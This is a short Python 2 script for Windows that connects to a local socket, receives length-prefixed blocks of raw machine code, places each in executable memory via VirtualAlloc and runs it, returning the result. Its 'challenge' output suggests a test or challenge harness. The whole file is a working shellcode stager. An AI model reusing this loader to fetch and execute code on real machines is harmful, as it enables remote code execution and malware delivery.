import ctypes
import socket
import sys
import struct

def recvall(sock, n):
    data = ''
    while len(data) < n:
        print len(data)
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

socksize = 1024
debug = 0
try:
    if sys.argv[1].lower() in ['d','debug','int','cc']:
        debug = 1
except:
    pass

try:
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
except socket.error, msg:
    print 'Failed to create socket. Error code: ' + str(msg[0]) + ', Error message: ' + msg[1]
    sys.exit();

print 'Socket Created'


ip = '127.0.0.1'
port = 11232


client_socket.connect((ip, port))
print 'Socket Connected to ' + ip

buf = ''

while True:
    size = client_socket.recv(4)
    size = struct.unpack('!l',size)[0]
    print "[+] challenge size: %d bytes"%size
    if size == 0: break
    if debug:
        buf = "\xcc"
    else:
        buf = ""
    buf += recvall(client_socket,size)
    code = bytearray(buf)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                              ctypes.c_int(len(code)),
                                              ctypes.c_int(0x3000),
                                              ctypes.c_int(0x40))
     
    buf = (ctypes.c_char * len(code)).from_buffer(code)
    
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                         buf,
                                         ctypes.c_int(len(code)))
     
    functype = ctypes.CFUNCTYPE(ctypes.c_int)
    func = functype(ptr)
    response = func()
    response = struct.pack('!l',response)
    client_socket.send(response)

    ctypes.windll.kernel32.VirtualFree(ptr,
                                       ctypes.c_int(0),
                                       ctypes.c_int(0x8000))
